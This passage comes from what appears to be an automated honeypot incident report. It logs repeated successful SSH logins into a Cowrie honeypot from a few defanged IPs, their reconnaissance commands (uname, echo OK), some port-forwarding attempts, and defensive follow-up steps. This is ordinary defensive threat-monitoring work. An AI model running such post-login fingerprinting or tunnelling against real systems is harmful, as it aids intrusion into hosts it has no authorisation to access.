| `2026-06-25 20:26:19` | `cowrie.client.version` |
| `2026-06-25 20:26:19` | `cowrie.client.kex` |
| `2026-06-25 20:26:19` | `cowrie.login.success` |
| `2026-06-25 20:26:20` | `cowrie.session.params` |
| `2026-06-25 20:26:20` | `cowrie.command.input` |
| `2026-06-25 20:26:20` | `cowrie.log.closed` |
| `2026-06-25 20:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cebd091d66c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:27 |
| **Last Seen** | 2026-06-25 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:27:05` | `cowrie.session.connect` |
| `2026-06-25 20:27:05` | `cowrie.client.version` |
| `2026-06-25 20:27:05` | `cowrie.client.kex` |
| `2026-06-25 20:27:06` | `cowrie.login.success` |
| `2026-06-25 20:27:07` | `cowrie.session.params` |
| `2026-06-25 20:27:07` | `cowrie.command.input` |
| `2026-06-25 20:27:07` | `cowrie.log.closed` |
| `2026-06-25 20:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83199a19349

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:27 |
| **Last Seen** | 2026-06-25 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:27:52` | `cowrie.session.connect` |
| `2026-06-25 20:27:52` | `cowrie.client.version` |
| `2026-06-25 20:27:53` | `cowrie.client.kex` |
| `2026-06-25 20:27:53` | `cowrie.login.success` |
| `2026-06-25 20:27:54` | `cowrie.session.params` |
| `2026-06-25 20:27:54` | `cowrie.command.input` |
| `2026-06-25 20:27:54` | `cowrie.log.closed` |
| `2026-06-25 20:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-780609b7bf0e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 20:28 |
| **Last Seen** | 2026-06-25 20:28 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:28:40` | `cowrie.session.connect` |
| `2026-06-25 20:28:41` | `cowrie.client.version` |
| `2026-06-25 20:28:41` | `cowrie.client.kex` |
| `2026-06-25 20:28:47` | `cowrie.login.success` |
| `2026-06-25 20:28:50` | `cowrie.session.params` |
| `2026-06-25 20:28:50` | `cowrie.command.input` |
| `2026-06-25 20:28:52` | `cowrie.log.closed` |
| `2026-06-25 20:28:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f9fbbb31be

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:28 |
| **Last Seen** | 2026-06-25 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:28:40` | `cowrie.session.connect` |
| `2026-06-25 20:28:40` | `cowrie.client.version` |
| `2026-06-25 20:28:40` | `cowrie.client.kex` |
| `2026-06-25 20:28:41` | `cowrie.login.success` |
| `2026-06-25 20:28:41` | `cowrie.session.params` |
| `2026-06-25 20:28:41` | `cowrie.command.input` |
| `2026-06-25 20:28:41` | `cowrie.log.closed` |
| `2026-06-25 20:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0496fd82da1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:29 |
| **Last Seen** | 2026-06-25 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:29:29` | `cowrie.session.connect` |
| `2026-06-25 20:29:29` | `cowrie.client.version` |
| `2026-06-25 20:29:29` | `cowrie.client.kex` |
| `2026-06-25 20:29:29` | `cowrie.login.success` |
| `2026-06-25 20:29:30` | `cowrie.session.params` |
| `2026-06-25 20:29:30` | `cowrie.command.input` |
| `2026-06-25 20:29:30` | `cowrie.log.closed` |
| `2026-06-25 20:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08abee03dff0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:30 |
| **Last Seen** | 2026-06-25 20:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:30:17` | `cowrie.session.connect` |
| `2026-06-25 20:30:17` | `cowrie.client.version` |
| `2026-06-25 20:30:17` | `cowrie.client.kex` |
| `2026-06-25 20:30:17` | `cowrie.login.success` |
| `2026-06-25 20:30:18` | `cowrie.session.params` |
| `2026-06-25 20:30:18` | `cowrie.command.input` |
| `2026-06-25 20:30:18` | `cowrie.log.closed` |
| `2026-06-25 20:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249c7d00bad7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:31 |
| **Last Seen** | 2026-06-25 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:31:06` | `cowrie.session.connect` |
| `2026-06-25 20:31:06` | `cowrie.client.version` |
| `2026-06-25 20:31:06` | `cowrie.client.kex` |
| `2026-06-25 20:31:06` | `cowrie.login.success` |
| `2026-06-25 20:31:07` | `cowrie.session.params` |
| `2026-06-25 20:31:07` | `cowrie.command.input` |
| `2026-06-25 20:31:07` | `cowrie.log.closed` |
| `2026-06-25 20:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32d332fc54f7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:31 |
| **Last Seen** | 2026-06-25 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:31:53` | `cowrie.session.connect` |
| `2026-06-25 20:31:53` | `cowrie.client.version` |
| `2026-06-25 20:31:53` | `cowrie.client.kex` |
| `2026-06-25 20:31:53` | `cowrie.login.success` |
| `2026-06-25 20:31:54` | `cowrie.session.params` |
| `2026-06-25 20:31:54` | `cowrie.command.input` |
| `2026-06-25 20:31:54` | `cowrie.log.closed` |
| `2026-06-25 20:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cae22551041

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:32 |
| **Last Seen** | 2026-06-25 20:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:32:40` | `cowrie.session.connect` |
| `2026-06-25 20:32:40` | `cowrie.client.version` |
| `2026-06-25 20:32:40` | `cowrie.client.kex` |
| `2026-06-25 20:32:41` | `cowrie.login.success` |
| `2026-06-25 20:32:41` | `cowrie.session.params` |
| `2026-06-25 20:32:41` | `cowrie.command.input` |
| `2026-06-25 20:32:42` | `cowrie.log.closed` |
| `2026-06-25 20:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d5c2a1a7681

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 20:32 |
| **Last Seen** | 2026-06-25 20:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:32:59` | `cowrie.session.connect` |
| `2026-06-25 20:32:59` | `cowrie.client.version` |
| `2026-06-25 20:32:59` | `cowrie.client.kex` |
| `2026-06-25 20:33:00` | `cowrie.login.success` |
| `2026-06-25 20:33:02` | `cowrie.session.params` |
| `2026-06-25 20:33:02` | `cowrie.command.input` |
| `2026-06-25 20:33:03` | `cowrie.log.closed` |
| `2026-06-25 20:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f551f98a7d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:33 |
| **Last Seen** | 2026-06-25 20:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:33:31` | `cowrie.session.connect` |
| `2026-06-25 20:33:31` | `cowrie.client.version` |
| `2026-06-25 20:33:31` | `cowrie.client.kex` |
| `2026-06-25 20:33:31` | `cowrie.login.success` |
| `2026-06-25 20:33:32` | `cowrie.session.params` |
| `2026-06-25 20:33:32` | `cowrie.command.input` |
| `2026-06-25 20:33:32` | `cowrie.log.closed` |
| `2026-06-25 20:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61090fb7020e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:34 |
| **Last Seen** | 2026-06-25 20:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:34:25` | `cowrie.session.connect` |
| `2026-06-25 20:34:25` | `cowrie.client.version` |
| `2026-06-25 20:34:25` | `cowrie.client.kex` |
| `2026-06-25 20:34:25` | `cowrie.login.success` |
| `2026-06-25 20:34:26` | `cowrie.session.params` |
| `2026-06-25 20:34:26` | `cowrie.command.input` |
| `2026-06-25 20:34:26` | `cowrie.log.closed` |
| `2026-06-25 20:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb086bf00f06

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:35 |
| **Last Seen** | 2026-06-25 20:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:35:17` | `cowrie.session.connect` |
| `2026-06-25 20:35:17` | `cowrie.client.version` |
| `2026-06-25 20:35:17` | `cowrie.client.kex` |
| `2026-06-25 20:35:17` | `cowrie.login.success` |
| `2026-06-25 20:35:18` | `cowrie.session.params` |
| `2026-06-25 20:35:18` | `cowrie.command.input` |
| `2026-06-25 20:35:18` | `cowrie.log.closed` |
| `2026-06-25 20:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5bf55443bd5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-06-25 20:35 |
| **Last Seen** | 2026-06-25 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:35:21` | `cowrie.session.connect` |
| `2026-06-25 20:35:21` | `cowrie.client.version` |
| `2026-06-25 20:35:21` | `cowrie.client.kex` |
| `2026-06-25 20:35:22` | `cowrie.login.success` |
| `2026-06-25 20:35:22` | `cowrie.direct-tcpip.request` |
| `2026-06-25 20:35:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-06-25 20:35:22` | `cowrie.direct-tcpip.data` |
| `2026-06-25 20:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b510d958b450

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-06-25 20:35 |
| **Last Seen** | 2026-06-25 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:35:22` | `cowrie.session.connect` |
| `2026-06-25 20:35:22` | `cowrie.client.version` |
| `2026-06-25 20:35:22` | `cowrie.client.kex` |
| `2026-06-25 20:35:22` | `cowrie.login.success` |
| `2026-06-25 20:35:23` | `cowrie.direct-tcpip.request` |
| `2026-06-25 20:35:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-06-25 20:35:23` | `cowrie.direct-tcpip.data` |
| `2026-06-25 20:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e28ae8f16d1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:36 |
| **Last Seen** | 2026-06-25 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:36:11` | `cowrie.session.connect` |
| `2026-06-25 20:36:11` | `cowrie.client.version` |
| `2026-06-25 20:36:12` | `cowrie.client.kex` |
| `2026-06-25 20:36:12` | `cowrie.login.success` |
| `2026-06-25 20:36:13` | `cowrie.session.params` |
| `2026-06-25 20:36:13` | `cowrie.command.input` |
| `2026-06-25 20:36:13` | `cowrie.log.closed` |
| `2026-06-25 20:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b43d717cf3db

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:37 |
| **Last Seen** | 2026-06-25 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:37:04` | `cowrie.session.connect` |
| `2026-06-25 20:37:04` | `cowrie.client.version` |
| `2026-06-25 20:37:04` | `cowrie.client.kex` |
| `2026-06-25 20:37:04` | `cowrie.login.success` |
| `2026-06-25 20:37:05` | `cowrie.session.params` |
| `2026-06-25 20:37:05` | `cowrie.command.input` |
| `2026-06-25 20:37:05` | `cowrie.log.closed` |
| `2026-06-25 20:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d3a84f1bc41

| Field | Detail |
|---|---|
| **Source IP** | `210.16.177[.]90` |
| **First Seen** | 2026-06-25 20:37 |
| **Last Seen** | 2026-06-25 20:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:37:19` | `cowrie.session.connect` |
| `2026-06-25 20:37:19` | `cowrie.client.version` |
| `2026-06-25 20:37:19` | `cowrie.client.kex` |
| `2026-06-25 20:37:20` | `cowrie.login.success` |
| `2026-06-25 20:37:21` | `cowrie.session.params` |
| `2026-06-25 20:37:21` | `cowrie.command.input` |
| `2026-06-25 20:37:22` | `cowrie.log.closed` |
| `2026-06-25 20:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.16.177[.]90` to AbuseIPDB if not already reported
- [ ] Block `210.16.177[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe9affae6ac

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:37 |
| **Last Seen** | 2026-06-25 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:37:53` | `cowrie.session.connect` |
| `2026-06-25 20:37:53` | `cowrie.client.version` |
| `2026-06-25 20:37:53` | `cowrie.client.kex` |
| `2026-06-25 20:37:53` | `cowrie.login.success` |
| `2026-06-25 20:37:54` | `cowrie.session.params` |
| `2026-06-25 20:37:54` | `cowrie.command.input` |
| `2026-06-25 20:37:54` | `cowrie.log.closed` |
| `2026-06-25 20:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f505cdc9c4de

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:38 |
| **Last Seen** | 2026-06-25 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:38:42` | `cowrie.session.connect` |
| `2026-06-25 20:38:42` | `cowrie.client.version` |
| `2026-06-25 20:38:42` | `cowrie.client.kex` |
| `2026-06-25 20:38:42` | `cowrie.login.success` |
| `2026-06-25 20:38:43` | `cowrie.session.params` |
| `2026-06-25 20:38:43` | `cowrie.command.input` |
| `2026-06-25 20:38:43` | `cowrie.log.closed` |
| `2026-06-25 20:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7b119024851

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:39 |
| **Last Seen** | 2026-06-25 20:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:39:30` | `cowrie.session.connect` |
| `2026-06-25 20:39:30` | `cowrie.client.version` |
| `2026-06-25 20:39:30` | `cowrie.client.kex` |
| `2026-06-25 20:39:30` | `cowrie.login.success` |
| `2026-06-25 20:39:31` | `cowrie.session.params` |
| `2026-06-25 20:39:31` | `cowrie.command.input` |
| `2026-06-25 20:39:31` | `cowrie.log.closed` |
| `2026-06-25 20:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54e4f7bb0903

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 20:40 |
| **Last Seen** | 2026-06-25 20:40 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:40:15` | `cowrie.session.connect` |
| `2026-06-25 20:40:17` | `cowrie.client.version` |
| `2026-06-25 20:40:17` | `cowrie.client.kex` |
| `2026-06-25 20:40:25` | `cowrie.login.success` |
| `2026-06-25 20:40:28` | `cowrie.session.params` |
| `2026-06-25 20:40:28` | `cowrie.command.input` |
| `2026-06-25 20:40:30` | `cowrie.log.closed` |
| `2026-06-25 20:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c3cdf33c52

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:40 |
| **Last Seen** | 2026-06-25 20:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:40:20` | `cowrie.session.connect` |
| `2026-06-25 20:40:20` | `cowrie.client.version` |
| `2026-06-25 20:40:20` | `cowrie.client.kex` |
| `2026-06-25 20:40:20` | `cowrie.login.success` |
| `2026-06-25 20:40:21` | `cowrie.session.params` |
| `2026-06-25 20:40:21` | `cowrie.command.input` |
| `2026-06-25 20:40:21` | `cowrie.log.closed` |
| `2026-06-25 20:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f41b2f021d8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:41 |
| **Last Seen** | 2026-06-25 20:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:41:10` | `cowrie.session.connect` |
| `2026-06-25 20:41:10` | `cowrie.client.version` |
| `2026-06-25 20:41:11` | `cowrie.client.kex` |
| `2026-06-25 20:41:11` | `cowrie.login.success` |
| `2026-06-25 20:41:12` | `cowrie.session.params` |
| `2026-06-25 20:41:12` | `cowrie.command.input` |
| `2026-06-25 20:41:12` | `cowrie.log.closed` |
| `2026-06-25 20:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2854cb1a8f87

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-25 20:41 |
| **Last Seen** | 2026-06-25 20:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:41:20` | `cowrie.session.connect` |
| `2026-06-25 20:41:20` | `cowrie.client.version` |
| `2026-06-25 20:41:20` | `cowrie.client.kex` |
| `2026-06-25 20:41:21` | `cowrie.login.success` |
| `2026-06-25 20:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8c6137da90

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-25 20:41 |
